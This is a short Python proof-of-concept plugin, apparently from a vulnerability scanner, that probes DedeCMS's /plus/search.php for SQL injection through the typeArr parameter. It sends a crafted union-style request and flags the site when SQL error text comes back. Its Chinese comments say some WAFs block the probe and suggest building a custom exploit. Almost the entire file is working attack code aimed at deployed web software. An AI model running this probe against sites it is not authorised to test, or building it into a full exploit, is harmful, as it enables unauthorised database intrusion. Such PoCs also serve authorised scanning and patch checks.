#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dedecms search.php SQL注入漏洞
referer: http://0daysec.blog.51cto.com/9327043/1571372
author: Lucifer
description: dedecms /plus/search.php typeArr存在SQL注入，由于有的waf会拦截自行构造EXP。
'''
import HackRequests

def poc(arg, **kwargs):
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/plus/search.php?keyword=test&typeArr[%20uNion%20]=a"
    vulnurl = arg + payload
    hh = HackRequests.hackRequests()
    try:
        r = hh.http(vulnurl,headers=headers)

        if r"Error infos" in r.text() and "Error sql" in r.text():
            result = {
                "name": "dedecms search.php sql注入",  # 插件名称
                "content": 'dedecms /plus/search.php typeArr存在SQL注入，由于有的waf会拦截自行构造EXP。',  # 插件返回内容详情，会造成什么后果。
                "url": vulnurl,  # 漏洞存在url
                "log": r.log,
                "tag": "sql_inject"  # 漏洞标签
            }
            return result

    except:
        return False
